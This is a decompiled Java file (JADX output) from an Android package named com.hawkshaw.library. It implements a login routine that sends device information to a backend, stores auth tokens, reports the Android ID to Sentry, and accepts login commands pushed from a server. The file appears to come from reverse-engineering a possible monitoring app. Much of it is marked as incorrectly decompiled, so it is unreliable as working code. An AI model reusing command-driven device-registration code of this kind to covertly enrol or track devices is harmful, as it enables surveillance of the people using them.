package com.hawkshaw.library.features;

import K1.b;
import Y1.J;
import a3.e;
import a3.j;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.ktextensions.CoroutineKt;
import t3.N;

public final class AuthKt {
    private static final String TAG = "Auth";

    /* JADX WARNING: type inference failed for: r1v6, types: [io.sentry.protocol.C, java.lang.Object] */
    /* JADX WARNING: type inference failed for: r3v7, types: [c3.c] */
    /* JADX WARNING: Multi-variable type inference failed */
    /* JADX WARNING: Removed duplicated region for block: B:16:0x0059  */
    /* JADX WARNING: Removed duplicated region for block: B:24:0x00b8  */
    /* JADX WARNING: Removed duplicated region for block: B:32:0x0108 A[RETURN] */
    /* JADX WARNING: Removed duplicated region for block: B:33:0x0109 A[RETURN] */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x0030  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static final java.lang.Object login(java.lang.String r21, int r22, a3.e r23) {
        /*
            r0 = r21
            r1 = r22
            r2 = r23
            boolean r3 = r2 instanceof K1.a
            if (r3 == 0) goto L_0x0019
            r3 = r2
            K1.a r3 = (K1.a) r3
            int r4 = r3.f1105G
            r5 = -2147483648(0xffffffff80000000, float:-0.0)
            r6 = r4 & r5
            if (r6 == 0) goto L_0x0019
            int r4 = r4 - r5
            r3.f1105G = r4
            goto L_0x001e
        L_0x0019:
            K1.a r3 = new K1.a
            r3.<init>(r2)
        L_0x001e:
            java.lang.Object r2 = r3.f1104F
            b3.a r4 = b3.C0298a.f4140D
            int r5 = r3.f1105G
            W2.y r6 = W2.y.f2418a
            java.lang.String r7 = "Login: Email: "
            r8 = 3
            r9 = 2
            r10 = 0
            java.lang.String r11 = ", RetryCount: "
            r12 = 1
            if (r5 == 0) goto L_0x0059
            if (r5 == r12) goto L_0x004c
            if (r5 == r9) goto L_0x0043
            if (r5 != r8) goto L_0x003b
            Y1.C0110h.P(r2)
            goto L_0x0109
        L_0x003b:
            java.lang.IllegalStateException r0 = new java.lang.IllegalStateException
            java.lang.String r1 = "call to 'resume' before 'invoke' with coroutine"
            r0.<init>(r1)
            throw r0
        L_0x0043:
            int r0 = r3.f1103E
            java.lang.String r1 = r3.f1102D
            Y1.C0110h.P(r2)
            goto L_0x00fd
        L_0x004c:
            int r0 = r3.f1103E
            java.lang.String r1 = r3.f1102D
            Y1.C0110h.P(r2)
            r20 = r1
            r1 = r0
            r0 = r20
            goto L_0x00b2
        L_0x0059:
            Y1.C0110h.P(r2)
            com.hawkshaw.library.logger.Logger r13 = com.hawkshaw.library.logger.Logger.INSTANCE
            java.lang.StringBuilder r2 = new java.lang.StringBuilder
            r2.<init>(r7)
            r2.append(r0)
            r2.append(r11)
            r2.append(r1)
            java.lang.String r15 = r2.toString()
            java.lang.String r14 = "Auth"
            r16 = 0
            r17 = 4
            r18 = 0
            com.hawkshaw.library.logger.Logger.d$default(r13, r14, r15, r16, r17, r18)
            r2 = 5
            if (r1 <= r2) goto L_0x007f
            return r6
        L_0x007f:
            com.hawkshaw.library.datalayer.Injector$Companion r2 = com.hawkshaw.library.datalayer.Injector.Companion
            com.hawkshaw.library.datalayer.Injector r2 = r2.getInstance()
            com.hawkshaw.library.datalayer.network.service.AuthService r2 = r2.getAuthService()
            com.hawkshaw.library.datalayer.models.LoginRequest r5 = new com.hawkshaw.library.datalayer.models.LoginRequest
            F3.b r13 = com.hawkshaw.library.datalayer.network.twirp.interceptors.ContentNegotiationInterceptorKt.getJson()
            com.hawkshaw.library.deviceinfo.DeviceInfo r14 = com.hawkshaw.library.deviceinfo.DeviceInfo.INSTANCE
            kotlinx.serialization.json.c r14 = com.hawkshaw.library.deviceinfo.DeviceInfo.getLoginDeviceInfo$default(r14, r10, r12, r10)
            r13.getClass()
            kotlinx.serialization.json.JsonObject$Companion r15 = kotlinx.serialization.json.c.Companion
            kotlinx.serialization.KSerializer r15 = r15.serializer()
            java.lang.String r13 = r13.b(r15, r14)
            r5.<init>(r0, r13)
            r3.f1102D = r0
            r3.f1103E = r1
            r3.f1105G = r12
            java.lang.Object r2 = r2.login(r5, r3)
            if (r2 != r4) goto L_0x00b2
            return r4
        L_0x00b2:
            com.hawkshaw.library.datalayer.network.twirp.ApiResponse r2 = (com.hawkshaw.library.datalayer.network.twirp.ApiResponse) r2
            boolean r5 = r2 instanceof com.hawkshaw.library.datalayer.network.twirp.ApiResponse.InProgress
            if (r5 != 0) goto L_0x016e
            boolean r5 = r2 instanceof com.hawkshaw.library.datalayer.network.twirp.ApiResponse.Error
            if (r5 == 0) goto L_0x010a
            com.hawkshaw.library.logger.Logger r13 = com.hawkshaw.library.logger.Logger.INSTANCE
            java.lang.String r2 = r2.getErrorMessage()
            java.lang.StringBuilder r5 = new java.lang.StringBuilder
            r5.<init>(r7)
            r5.append(r0)
            r5.append(r11)
            r5.append(r1)
            java.lang.String r7 = ", Error: "
            r5.append(r7)
            r5.append(r2)
            java.lang.String r15 = r5.toString()
            r16 = 0
            r17 = 0
            java.lang.String r14 = "Auth"
            r18 = 12
            r19 = 0
            com.hawkshaw.library.logger.Logger.e$default(r13, r14, r15, r16, r17, r18, r19)
            r3.f1102D = r0
            r3.f1103E = r1
            r3.f1105G = r9
            r13 = 5000(0x1388, double:2.4703E-320)
            java.lang.Object r2 = Y1.K.C(r13, r3)
            if (r2 != r4) goto L_0x00f8
            return r4
        L_0x00f8:
            r20 = r1
            r1 = r0
            r0 = r20
        L_0x00fd:
            int r0 = r0 + r12
            r3.f1102D = r10
            r3.f1105G = r8
            java.lang.Object r0 = login(r1, r0, r3)
            if (r0 != r4) goto L_0x0109
            return r4
        L_0x0109:
            return r6
        L_0x010a:
            boolean r3 = r2 instanceof com.hawkshaw.library.datalayer.network.twirp.ApiResponse.Success
            if (r3 == 0) goto L_0x016e
            com.hawkshaw.library.logger.Logger r12 = com.hawkshaw.library.logger.Logger.INSTANCE
            java.lang.StringBuilder r3 = new java.lang.StringBuilder
            java.lang.String r4 = "Login Success: Email: "
            r3.<init>(r4)
            r3.append(r0)
            r3.append(r11)
            r3.append(r1)
            java.lang.String r14 = r3.toString()
            java.lang.String r13 = "Auth"
            r15 = 0
            r16 = 4
            r17 = 0
            com.hawkshaw.library.logger.Logger.d$default(r12, r13, r14, r15, r16, r17)
            com.hawkshaw.library.datalayer.network.twirp.ApiResponse$Success r2 = (com.hawkshaw.library.datalayer.network.twirp.ApiResponse.Success) r2
            java.lang.Object r1 = r2.getResult()
            com.hawkshaw.library.datalayer.models.LoginResponse r1 = (com.hawkshaw.library.datalayer.models.LoginResponse) r1
            com.hawkshaw.library.preferences.Prefs r2 = com.hawkshaw.library.preferences.Prefs.INSTANCE
            java.lang.String r3 = r1.getEmail()
            r2.setEmail(r3)
            java.lang.String r3 = r1.getToken()
            r2.setToken(r3)
            java.lang.String r1 = r1.getRefreshToken()
            r2.setRefreshToken(r1)
            io.sentry.protocol.C r1 = new io.sentry.protocol.C
            r1.<init>()
            r1.f7007D = r0
            com.hawkshaw.library.deviceinfo.DeviceInfo r0 = com.hawkshaw.library.deviceinfo.DeviceInfo.INSTANCE
            java.lang.String r0 = r0.getAndroidId()
            W2.h r2 = new W2.h
            java.lang.String r3 = "android_id"
            r2.<init>(r3, r0)
            java.util.Map r0 = Y1.C0110h.C(r2)
            java.util.concurrent.ConcurrentHashMap r0 = Y1.K.f0(r0)
            r1.f7014K = r0
            io.sentry.A0.e(r1)
        L_0x016e:
            return r6
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.AuthKt.login(java.lang.String, int, a3.e):java.lang.Object");
    }

    public static /* synthetic */ Object login$default(String str, int i5, e eVar, int i6, Object obj) {
        if ((i6 & 2) != 0) {
            i5 = 0;
        }
        return login(str, i5, eVar);
    }

    /* JADX WARNING: type inference failed for: r0v2, types: [c3.i, i3.p] */
    /* JADX WARNING: type inference failed for: r0v4, types: [c3.c] */
    /* JADX WARNING: Multi-variable type inference failed */
    /* JADX WARNING: Removed duplicated region for block: B:12:0x0031  */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x0023  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static final java.lang.Object refreshTokens(a3.e r6) {
        /*
            boolean r0 = r6 instanceof K1.c
            if (r0 == 0) goto L_0x0013
            r0 = r6
            K1.c r0 = (K1.c) r0
            int r1 = r0.f1109E
            r2 = -2147483648(0xffffffff80000000, float:-0.0)
            r3 = r1 & r2
            if (r3 == 0) goto L_0x0013
            int r1 = r1 - r2
            r0.f1109E = r1
            goto L_0x0018
        L_0x0013:
            K1.c r0 = new K1.c
            r0.<init>(r6)
        L_0x0018:
            java.lang.Object r6 = r0.f1108D
            b3.a r1 = b3.C0298a.f4140D
            int r2 = r0.f1109E
            r3 = 2
            r4 = 1
            r5 = 0
            if (r2 == 0) goto L_0x0031
            if (r2 != r4) goto L_0x0029
            Y1.C0110h.P(r6)
            goto L_0x0054
        L_0x0029:
            java.lang.IllegalStateException r6 = new java.lang.IllegalStateException
            java.lang.String r0 = "call to 'resume' before 'invoke' with coroutine"
            r6.<init>(r0)
            throw r6
        L_0x0031:
            Y1.C0110h.P(r6)
            com.hawkshaw.library.preferences.Prefs r6 = com.hawkshaw.library.preferences.Prefs.INSTANCE
            java.lang.String r6 = r6.getEmail()
            if (r6 == 0) goto L_0x0042
            boolean r2 = r3.j.U(r6)
            if (r2 == 0) goto L_0x004a
        L_0x0042:
            com.hawkshaw.library.datalayer.models.Config r6 = com.hawkshaw.library.config.ConfigKt.getConfig$default(r5, r4, r5)
            java.lang.String r6 = r6.getEmail()
        L_0x004a:
            r0.f1109E = r4
            r2 = 0
            java.lang.Object r6 = login$default(r6, r2, r0, r3, r5)
            if (r6 != r1) goto L_0x0054
            return r1
        L_0x0054:
            z3.d r6 = t3.N.f9290a
            y3.f r6 = Y1.J.a(r6)
            K1.d r0 = new K1.d
            r0.<init>(r3, r5)
            com.hawkshaw.library.ktextensions.CoroutineKt.safeLaunch$default(r6, r5, r0, r4, r5)
            W2.y r6 = W2.y.f2418a
            return r6
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.AuthKt.refreshTokens(a3.e):java.lang.Object");
    }

    public static final void login(Command.LoginRequest loginRequest) {
        if (loginRequest != null) {
            CoroutineKt.safeLaunch$default(J.a(N.f9290a), (j) null, new b(loginRequest, (e) null), 1, (Object) null);
        }
    }
}
